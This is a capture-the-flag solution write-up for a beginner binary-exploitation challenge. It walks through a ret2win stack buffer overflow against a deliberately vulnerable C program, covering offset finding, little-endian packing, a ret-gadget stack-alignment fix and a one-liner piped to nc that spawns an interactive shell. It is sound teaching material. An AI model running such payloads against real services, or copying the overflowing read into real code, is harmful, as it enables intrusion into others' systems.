# RETURNAL — Solution

**Category:** Pwn / Binary Exploitation
**Difficulty:** Beginner
**Technique:** Stack Buffer Overflow / ret2win

---

## 1. Overview

The goal of this challenge is to redirect program execution to a hidden
function called `win()`.

The vulnerable function is effectively:

```c
void vulnerable(void)
{
    char buffer[64];

    read(0, buffer, 256);
}
```

The important detail is that `buffer` can only hold **64 bytes**, while
`read()` allows up to **256 bytes** to be written.

This creates a classic **stack-based buffer overflow**.

The intended exploit is a **ret2win** attack:

> Overflow the buffer, overwrite the saved return address, and replace it
> with the address of `win()`.

The challenge does not provide the source code to the player, so the intended
solution requires inspecting the binary to discover these details.

---

# 2. Understanding the Program

The important functions are:

```c
void win(void)
{
    printf("You found the secret!\n");
    system("/bin/sh");
}

void vulnerable(void)
{
    char buffer[64];

    read(0, buffer, 256);
}

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    vulnerable();

    return 0;
}
```

Under normal execution:

```text
main()
  |
  v
vulnerable()
  |
  v
return to main()
```

However, `read()` allows significantly more data to be written than the
buffer can hold.

This means data stored after `buffer` on the stack can be overwritten.

One of those values is the **saved return address**.

---

# 3. Finding the Interesting Function

Since the source code is not provided to the player, the first step is to
inspect the binary.

Start with:

```bash
file returnal
```

This reveals information such as the architecture and binary format.

We can then inspect the symbols:

```bash
readelf -s returnal
```

or disassemble the binary:

```bash
objdump -d returnal
```

We are looking for a function named `win`.

For example:

```bash
objdump -d returnal | grep -A20 '<win>'
```

may show:

```text
0000000000401156 <win>:
```

In that particular binary, the address would therefore be:

```text
0x401156
```

**The actual address must be taken from the challenge binary being exploited.**

---

# 4. Understanding the Stack

Inside `vulnerable()` we have:

```c
char buffer[64];
```

A simplified stack frame looks like:

```text
Higher addresses
+---------------------------+
| Saved return address      |  <-- saved RIP
+---------------------------+
| Saved RBP                 |
+---------------------------+
|                           |
|       buffer[64]          |
|                           |
+---------------------------+
Lower addresses
```

When `vulnerable()` executes `ret`, the CPU takes the value stored in the
saved return-address location and loads it into `RIP`.

Normally, this means execution returns to `main()`.

If we overwrite that value, we can control where execution continues.

Our desired control flow is:

```text
vulnerable()
     |
     | ret
     v
   win()
     |
     v
system("/bin/sh")
```

---

# 5. Finding the Offset

Knowing the address of `win()` is only part of the exploit.

We also need to determine how many bytes are required to reach the saved
return address.

Although the local buffer is 64 bytes, the saved return address is normally
located further up the stack.

A typical layout is:

```text
buffer          64 bytes
saved RBP        8 bytes
saved RIP        8 bytes
```

This would place the saved RIP **72 bytes** from the beginning of the buffer:

```text
64 + 8 = 72
```

However, the offset should be **verified against the actual compiled binary**.

Compiler options, optimization, stack layout, and other details can affect
the exact layout.

---

# 6. Determining the Offset with GDB

Start GDB:

```bash
gdb ./returnal
```

Disassemble the vulnerable function:

```gdb
disassemble vulnerable
```

The function prologue can reveal how much stack space is reserved.

You can also run the program with a recognizable pattern and inspect the
stack/registers after the overflow.

For example:

```gdb
run
```

Then provide increasingly large inputs.

Another useful approach is to use a cyclic pattern if a tool such as pwntools
is available.

For example:

```python
from pwn import *

print(cyclic(200).decode())
```

After the program crashes, inspect the registers:

```gdb
info registers
```

If the saved instruction pointer has been overwritten, its value can be used
to determine the exact offset.

With pwntools:

```python
cyclic_find(value)
```

For this challenge, the intended offset is expected to be **72 bytes**, but it
should still be confirmed against the actual binary.

---

# 7. Confirming Control of RIP

A simple test is to send more than enough `A` characters:

```bash
python3 -c 'print("A" * 80)' | ./returnal
```

If the saved return address has been reached, the program may attempt to
return to something resembling:

```text
0x4141414141414141
```

because ASCII `A` is:

```text
0x41
```

This is strong evidence that we control the saved return address.

At this point, the exploit is no longer about simply crashing the program.

The goal is to replace those `A`s with a useful address.

---

# 8. Little-Endian Addresses

On x86-64, multi-byte values are stored in **little-endian** order.

Suppose the address of `win()` is:

```text
0x401156
```

The 64-bit representation is:

```text
0x0000000000401156
```

In memory, the bytes appear as:

```text
56 11 40 00 00 00 00 00
```

This is why exploit scripts generally pack addresses using little-endian
encoding.

With Python:

```python
import struct

address = struct.pack("<Q", 0x401156)
```

Here:

* `<` means little-endian
* `Q` means an unsigned 64-bit integer

Pwntools provides an equivalent helper:

```python
p64(0x401156)
```

---

# 9. The Basic Ret2win Payload

Once the offset and `win()` address have been verified, the basic payload is:

```text
[ padding ][ win() address ]
```

If the verified offset is 72 bytes:

```python
payload = b"A" * 72
payload += p64(win_address)
```

Using Python's standard library:

```python
import struct
import sys

payload = b"A" * 72
payload += struct.pack("<Q", win_address)

sys.stdout.buffer.write(payload)
```

When `vulnerable()` executes `ret`, execution goes to `win()` instead of
returning normally.

---

# 10. Testing the Basic Exploit

For example:

```bash
python3 -c 'import struct,sys; sys.stdout.buffer.write(b"A"*72 + struct.pack("<Q", 0x401156))' | ./returnal
```

Replace `0x401156` with the address obtained from the actual binary.

If successful, the program reaches:

```text
You found the secret!
```

and then executes:

```c
system("/bin/sh");
```

which gives us a shell.

However, there is an important x86-64 detail that can cause the exploit to
reach `win()` successfully but still crash afterward.

That detail is **stack alignment**.

---

# 11. The Stack Alignment Problem

The System V AMD64 ABI specifies a **16-byte stack alignment convention**.

Normally, when functions are called, the combination of `call`, the function
prologue, and the function epilogue maintains the expected stack alignment.

Our exploit changes that normal control flow.

Normally:

```text
main()
  |
  | call vulnerable()
  v
vulnerable()
  |
  | ret
  v
main()
```

With the exploit:

```text
vulnerable()
     |
     | ret
     v
   win()
```

We enter `win()` using a `ret` rather than reaching it through the normal
`call` instruction.

This can leave the stack in a different alignment from what `win()` or one
of the functions it calls expects.

This is particularly relevant because `win()` calls:

```c
system("/bin/sh");
```

If the stack is incorrectly aligned, the program can potentially crash inside
libc even though the `win()` address and overflow offset are correct.

For example, you might see:

```text
You found the secret!
Segmentation fault
```

That can indicate an alignment problem rather than an incorrect ret2win
payload.

---

# 12. Checking Stack Alignment

GDB can be used to inspect `rsp`:

```gdb
info registers rsp
```

or:

```gdb
p/x $rsp
```

You can then consider:

```text
rsp % 16
```

For example, if:

```text
rsp = 0x7fffffffe0a8
```

then:

```text
0xe0a8 % 16 = 8
```

so the stack is 8 bytes away from a 16-byte boundary.

You can also inspect the stack itself:

```gdb
x/10gx $rsp
```

This makes it possible to see the addresses that will be consumed by the
`ret` instructions.

---

# 13. Fixing Stack Alignment with a `ret` Gadget

A common solution is to insert a standalone `ret` instruction before
`win()`.

Instead of:

```text
padding
win()
```

we use:

```text
padding
ret
win()
```

The `ret` instruction pops another 8-byte value from the stack.

Therefore, it effectively advances `rsp` by 8 bytes:

```text
rsp = rsp + 8
```

This changes the alignment between the two possible states:

```text
0 mod 16
```

and:

```text
8 mod 16
```

which can put the stack into the alignment expected by the code inside
`win()` and `system()`.

---

# 14. Finding a `ret` Gadget

A simple `ret` instruction can usually be found in the binary.

For example:

```bash
objdump -d returnal | grep -w ret
```

You might find:

```text
40101a: c3    ret
```

The address would then be:

```text
0x40101a
```

Tools such as ROPgadget can also be used:

```bash
ROPgadget --binary returnal
```

which may produce something similar to:

```text
0x000000000040101a : ret
```

Again, the address must be verified against the actual challenge binary.

---

# 15. The Aligned Payload

The payload becomes:

```text
[ padding ][ ret gadget ][ win() address ]
```

Assuming:

```text
offset = 72
ret    = 0x40101a
win    = 0x401156
```

we can construct it with:

```python
from pwn import *

payload = b"A" * 72
payload += p64(0x40101a)
payload += p64(0x401156)
```

Or using only Python's standard library:

```python
import struct
import sys

ret = 0x40101a
win = 0x401156

payload = b"A" * 72
payload += struct.pack("<Q", ret)
payload += struct.pack("<Q", win)

sys.stdout.buffer.write(payload)
```

The execution flow is now:

```text
vulnerable()
     |
     | ret
     v
ret gadget
     |
     | ret
     v
   win()
     |
     v
system("/bin/sh")
```

The additional `ret` changes the stack alignment by 8 bytes before `win()`
executes its function call.

---

# 16. Why the Extra `ret` Works

Consider the stack before the first return:

```text
+----------------+
| ret gadget     |
+----------------+
| win()          |
+----------------+
```

The first `ret`:

1. Pops the `ret` gadget address.
2. Transfers execution to that gadget.
3. Advances `rsp` by 8 bytes.

The gadget then executes another `ret`:

1. Pops the `win()` address.
2. Transfers execution to `win()`.
3. Advances `rsp` by another 8 bytes.

The additional return therefore changes the stack state by one extra
8-byte step compared with a direct jump to `win()`.

---

# 17. The Alignment Fix Is Not Always Required

It is important not to blindly assume that every ret2win exploit needs an
extra `ret`.

The correct payload depends on the actual binary and runtime environment.

Try the direct payload first:

```text
padding + win()
```

If it successfully gives a shell, there is no reason to add anything else.

If the program reaches `win()` but crashes during or after:

```c
system("/bin/sh");
```

then investigate the stack alignment.

If alignment is the issue, use:

```text
padding + ret + win()
```

This distinction is important because the exploit should be based on the
actual state of the program, not on a fixed recipe.

---

# 18. Keeping the Shell's stdin Open

There is one final detail when testing the exploit against the network
service.

If we generate the payload and pipe it directly into `nc`:

```bash
python3 exploit.py | nc localhost 1339
```

the payload is sent successfully, but once the Python process finishes,
its stdout closes.

That means `nc` eventually sees EOF on its stdin.

If the exploit has spawned `/bin/sh`, the shell also depends on that input
stream for commands. Closing the stream means we cannot properly interact
with the spawned shell.

We can keep stdin open by appending `cat`:

```bash
(python3 exploit.py; cat) | nc localhost 1339
```

The sequence is:

```text
python3 exploit.py
        |
        | sends exploit
        v
      nc
        |
        v
     program
        |
        v
      win()
        |
        v
    /bin/sh
```

After the Python script finishes, `cat` continues reading from our terminal
and sends whatever we type through `nc`.

This keeps the shell's stdin connected to us.

For example, a one-liner can be:

```bash
(python3 -c 'import struct,sys; sys.stdout.buffer.write(b"A"*72 + struct.pack("<Q", 0x40101a) + struct.pack("<Q", 0x401156)); sys.stdout.flush();' ; cat) | nc localhost 1339
```

The exact `ret` and `win()` addresses must of course be replaced with the
values from the actual challenge binary.

Once the exploit succeeds, we should be able to type commands such as:

```text
id
ls
cat flag.txt
```

and receive their output from the spawned shell.

---

# 19. Complete Exploitation Process

The complete intended workflow is:

### Step 1 — Inspect the binary

```bash
file returnal
```

### Step 2 — Find interesting functions

```bash
readelf -s returnal
```

or:

```bash
objdump -d returnal
```

### Step 3 — Find `win()`

```bash
objdump -d returnal | grep -A20 '<win>'
```

Record its address.

### Step 4 — Analyze `vulnerable()`

```bash
gdb ./returnal
```

Then:

```gdb
disassemble vulnerable
```

### Step 5 — Determine the offset

Use the stack layout or a cyclic pattern to determine how many bytes are
needed to overwrite saved RIP.

For this challenge, the expected offset is:

```text
72 bytes
```

but this should be verified against the actual binary.

### Step 6 — Confirm RIP control

Send a sufficiently large pattern and inspect the crash.

### Step 7 — Build the basic payload

```text
padding + win()
```

### Step 8 — Test it

If `win()` executes and the shell works, the exploit is complete.

### Step 9 — Fix alignment if necessary

Find a `ret` gadget and use:

```text
padding + ret + win()
```

### Step 10 — Connect to the server

Keep stdin open so that the spawned shell remains interactive:

```bash
(python3 exploit.py; cat) | nc localhost 1339
```

---

# 20. Final Exploit Structure

The basic exploit is:

```text
+---------------------------+
| padding                   |
|                           |
| 72 bytes                  |
+---------------------------+
| address of win()          |
+---------------------------+
```

If stack alignment needs to be corrected:

```text
+---------------------------+
| padding                   |
|                           |
| 72 bytes                  |
+---------------------------+
| address of ret gadget     |
+---------------------------+
| address of win()          |
+---------------------------+
```

The second form is a simple two-stage return sequence.

---

# 21. Why This Works

The original saved return address might look conceptually like:

```text
+---------------------------+
| return address -> main    |
+---------------------------+
```

After the overflow:

```text
+---------------------------+
| return address -> win     |
+---------------------------+
```

When the function executes:

```asm
ret
```

the CPU loads the overwritten value into `RIP`.

Instead of:

```text
RIP = main
```

we get:

```text
RIP = win
```

The program therefore executes the hidden function.

If an alignment gadget is required, the control flow becomes:

```text
RIP = ret gadget
       |
       v
     ret
       |
       v
RIP = win
```

The `win()` function then executes:

```c
printf("You found the secret!\n");
system("/bin/sh");
```

giving the player access to a shell.

---

# 22. Key Takeaways

This challenge introduces several fundamental binary-exploitation concepts:

* A buffer overflow occurs when more data is written than a buffer can hold.
* Local variables such as buffers are stored on the stack.
* The saved return address controls where execution continues after a
  function returns.
* Overwriting the saved return address allows control-flow redirection.
* A **ret2win** exploit reuses an existing function instead of injecting
  shellcode.
* x86-64 uses little-endian representation for multi-byte values in memory.
* The exact offset to saved RIP must be determined from the actual binary.
* The exact address of `win()` must be obtained from the actual binary.
* Stack alignment can matter when entering a function through a crafted
  `ret`.
* A single `ret` gadget can shift `rsp` by 8 bytes and correct the alignment
  when necessary.
* When exploiting a network service with a piped payload, stdin may need to
  remain open so that the spawned shell can be interacted with.

The central idea is:

```text
Buffer overflow
      |
      v
Control saved RIP
      |
      v
ret ----------------------+
      |                   |
      | alignment needed  | no alignment needed
      v                   |
   ret gadget             |
      |                   |
      +--------+----------+
               |
               v
             win()
               |
               v
        system("/bin/sh")
               |
               v
          interactive
             shell
```

> **The goal of the overflow is not simply to crash the program. The goal is
> to gain control of the saved return address and redirect execution to code
> that is already present in the binary.**
